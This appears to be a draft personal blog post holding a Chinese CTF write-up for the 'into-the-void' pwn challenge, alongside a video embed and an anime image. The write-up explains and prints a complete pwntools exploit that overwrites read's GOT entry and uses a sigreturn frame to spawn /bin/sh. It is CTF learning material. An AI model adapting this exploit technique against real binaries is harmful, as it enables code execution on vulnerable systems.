---
title: Test post
published: 2026-03-26
description: My first post. Congratulations.
tags: []
category: test
draft: true
---

## 我youtube喜欢看的视频

<iframe width="560" height="315" src="https://www.youtube.com/embed/MCniEJSh12U?si=Mn5X1sg4KZBTHrMK" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## 某道题的WP

[附件](https://github.com/sea1dream/pwn_contest_attachments/tree/main/K17%20CTF%202025/into-the-void)

朴素的`read`，有`pop rsi`，但我没用上

`read_payload`在`leave;ret`前会将`eax`设置为15，考虑`SROP`，但是没有`syscall`，于是改`read`的`got`表，其实好像也可以用栈上的残留数据，但是我没有找到残留的`libc`地址附近的`syscall; ret`，然后才回到`got`，但是`got`表地址附件也没有`syscall; ret`，然后想了想好像不用`ret`，有`syscall`就行。

大致流程是先设置好修改`syscall`返回后的`rbp`和`retaddr`，顺便读入`frame`

然后修改`syscall`，之后`leave;ret`执行`SROP`，再执行`execve('/bin/sh',0,0)`

```python
#!/usr/bin/env python3

from pwn import *
import os

# 获取当前脚本所在目录的绝对路径
base_dir = os.path.dirname(os.path.abspath(__file__))
# 将工作目录切换到脚本所在目录
os.chdir(base_dir)
print("当前工作目录:", os.getcwd())

pwn = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = pwn
context(arch="amd64", os="linux")
context.log_level = "debug"
# context.terminal = ['tmux', 'splitw', '-h']
elf = pwn

gs = """
b *0x40115C
"""

choice = 0x0
if choice:
    port = 9999
    target = "localhost"
    p = remote(target, port)
else:
    p = process([pwn.path])
    # p = gdb.debug(context.binary.path, gdbscript=gs)


def debug(cmd=""):
    if choice == 1:
        return
    gdb.attach(p, gdbscript=cmd)


def get_sb():
    return libc_base + libc.sym["system"], libc_base + next(libc.search(b"/bin/sh\x00"))


def str_to_hex(Str):
    return "0x" + bytearray(reversed(Str.encode())).hex()


def to_hex_escape(b: bytes) -> bytes:
    """
    把任意 bytes 转成全是 \\xHH 形式的“16进制转义 bytes”。
    例：b'D\\x89' -> b'\\x44\\x89'
    """
    return b"".join((r"\x%02x" % byte).encode("ascii") for byte in b)


libc_base = b"fake_libc_base"

s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
sa = lambda x, data: p.sendafter(x, data)
sla = lambda x, data: p.sendlineafter(x, data)
r = lambda num=4096: p.recv(num)
rl = lambda num=4096: p.recvline(num)
ru = lambda x: p.recvuntil(x)
itr = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
uru64 = lambda: uu64(ru("\x7f")[-6:])
libc_os = lambda x: libc_base + x
# 定义颜色常量（无大括号）
GREEN = "\033[92m"
RESET = "\033[0m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
leak = lambda name: print("%s[+] %s = %s%s" % (YELLOW, name, hex(eval(name)), RESET))


debug("b *0x40115C")

# 0x404000           0x405000 rw-p     1000    5000 chal_patched +0x18
syscall = elf.got.read
read_payload = 0x40114B
leave_ret = 0x401169
pop_rbp = 0x000000000040111D
pop_rsi = 0x000000000040113A

payload = b"a" * 0xC + p64(syscall + 0x300) + p64(read_payload)
pause()
s(payload)

payload = b"A" * 0xC + p64(syscall + 0xC + 0xC) + p64(read_payload)
pause()
s(payload)


binsh = syscall + 0x60
payload = p64(syscall - 8) + p64(leave_ret)
payload = payload.ljust(0x60 - 0xC, b"\x00")
payload += b"/bin/sh\x00"
payload += p64(0)
payload += (
    p64(binsh)  # rdi
    + p64(0)  # rsi
    + p64(syscall - 8)  # rbp
    + p64(0)  # rbx
    + p64(0)  # rdx
    + p64(59)  # rax
    + p64(0)  # rcx
    + p64(syscall)  # rsp
    + p64(leave_ret)  # rip
    + p64(277)  # eflags
    + p64(0x33)  # cs
)
payload = payload.ljust(0x200, b"\x00")
payload += 0xF4 * b"B"
payload += p64(0x520) + p64(pop_rbp) + p64(syscall + 0xC) + p64(read_payload)
pause()
s(payload)
# 0x000000000011BB2C:
payload = p16(0xBB2C)
pause()
s(payload)
itr()
```

## 喜多川海梦
![seadream](data:image/jpeg;base64,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)





